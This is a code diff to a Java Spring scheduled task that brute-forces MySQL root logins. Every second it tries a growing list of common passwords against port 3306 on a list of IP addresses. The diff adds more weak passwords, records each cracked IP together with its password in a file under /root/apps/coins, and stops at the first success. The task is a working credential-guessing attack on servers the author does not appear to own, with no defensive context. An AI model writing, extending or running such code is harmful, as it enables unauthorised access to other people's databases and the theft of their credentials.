@@ -27,7 +27,9 @@ public class MySqlTask {
 
     private static final String USER = "root";
     private static final String PATH = "/root/apps/coins/ipList.txt";
-    List<String> checkList = Arrays.asList("root", "123456", "admin", "admin123", "admin123456", "root123", "root123456", "12345678", "Admin", "admin@123");
+    List<String> checkList = Arrays.asList("root", "123456", "admin", "admin123", "admin123456", "root123",
+            "root123456", "12345678", "Admin", "admin@123", "12345", "123456789", "test1", "password", "zinch",
+            "asdf", "qwerty", "iloveyou", "abc123", "111111", "123123", "test", "root@123");
     Set<String> allIp = new HashSet<>();
 
     @Scheduled(cron = "*/1 * * * * ?")
@@ -49,9 +51,10 @@ public class MySqlTask {
                 Class.forName("com.mysql.jdbc.Driver");
                 String url = "jdbc:mysql://" + ip + ":3306/mysql?useSSL=false&connectTimeout=1500&socketTimeout=1500";
                 conn = (Connection) DriverManager.getConnection(url, USER, pass); //创建连接
-                log.info("ip:" + ip);
+                log.info("ip:" + ip + " " + pass);
                 allIp.add(ip);
-                method2(PATH, ip);
+                method2(PATH, ip + " " + pass);
+                break;
             } catch (Exception e) {
                 if (e.getMessage().contains("YES")) {
                     continue;
